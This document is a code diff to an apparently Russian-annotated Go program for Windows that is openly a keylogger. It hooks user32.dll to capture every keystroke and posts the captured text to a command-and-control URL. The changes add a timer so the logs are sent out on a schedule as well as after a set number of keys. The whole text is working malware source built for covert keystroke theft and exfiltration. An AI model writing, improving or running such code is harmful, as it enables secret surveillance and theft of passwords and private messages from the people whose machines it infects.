@@ -1,11 +1,9 @@
-// Package keylogger is a keylogger for windows
 package main
 
 import (
 	"errors"
 	"flag"
 	"fmt"
-	"io"
 	"net/http"
 	"strings"
 	"syscall"
@@ -17,6 +15,7 @@ import (
 )
 
 var (
+	sleep     = 5
 	user32LIB = syscall.NewLazyDLL("user32.dll")
 
 	procGetKeyboardLayout = user32LIB.NewProc("GetKeyboardLayout")
@@ -117,7 +116,16 @@ func (kl Keylogger) ParseKeycode(keyCode int) Key {
 }
 
 //SendKeyLog sends an HTTP request to specified in cmd arguments server
-func SendKeyLog(buf io.Reader, url string) {
+func SendKeyLog(enteredKeys []string, url string) {
+
+	var strToSend string
+
+	for i := range enteredKeys {
+		strToSend += enteredKeys[i]
+	}
+
+	buf := strings.NewReader(strToSend)
+
 	method := "POST"
 	client := &http.Client{}
 
@@ -141,34 +149,60 @@ func SendKeyLog(buf io.Reader, url string) {
 func main() {
 
 	var (
-		frequencyFlag  = flag.Int("frequency", 5, "Time period to check if key state")
-		keysToSendFlag = flag.Int("period", 10, "Num of keys to store and send at one time")
-		url            = flag.String("url", "", "C&C URL (Don't forget http://)")
+		keysToSendFlag    = flag.Int("kCount", 1000, "Num of keys to store and send at one time[DEFAULT: 1000]")
+		timeUntilSendFlag = flag.Int("tCount", 10, "Minutes until send captured keys [DEFAULT: 10]")
+		url               = flag.String("url", "", "C&C URL (Don't forget http://) [DEFAULT: EMPTY]")
 	)
 
 	flag.Parse()
 
+	timeUntilSend := time.Minute * time.Duration(*timeUntilSendFlag)
+
 	if *url != "" {
 		kl := NewKeyLogger()
+		var enteredKeys []string
 
-		var sKey []string
+		// empty timer creation
+		timer := time.NewTimer(0)
+
+		// timer func that fires with timer
+		var timerFunc func()
+
+		// timer func implementation
+		timerFunc = func() {
+			now := time.Now()
+			if len(enteredKeys) != 0 {
+				fmt.Println(now, "Отправка время", timeUntilSend)
+				SendKeyLog(enteredKeys, *url)
+				enteredKeys = nil
+			}
+			// delayed timer execution
+			timer = time.AfterFunc(timeUntilSend, timerFunc)
+		}
+
+		// start timer when program starts
+		timer = time.AfterFunc(timeUntilSend, timerFunc)
 
 		for {
+			//key is equals last pressed key from a Keylogger struct
 			key := kl.PressedKey()
-			var strToSend string
+
 			if !key.Empty {
-				sKey = append(sKey, string(key.Rune))
-				if len(sKey) >= *keysToSendFlag {
-					for i := range sKey {
-						strToSend += sKey[i]
-					}
-					buffer := strings.NewReader(strToSend)
-					sKey = nil
-					SendKeyLog(buffer, *url)
+				enteredKeys = append(enteredKeys, string(key.Rune))
+				fmt.Println(string(key.Rune))
+
+				//if number of entered keys is larger than keysToSendFlag, then SendKeyLog is being called
+				if len(enteredKeys) >= *keysToSendFlag {
+					fmt.Println(time.Now(), "Отправка кол-во символов")
+					SendKeyLog(enteredKeys, *url)
+					enteredKeys = nil
+
+					timer.Stop()
+					timer = time.AfterFunc(timeUntilSend, timerFunc)
+
 				}
 			}
-
-			time.Sleep(time.Duration(*frequencyFlag) * time.Millisecond)
+			time.Sleep(time.Duration(sleep) * time.Millisecond)
 
 		}
 	} else {
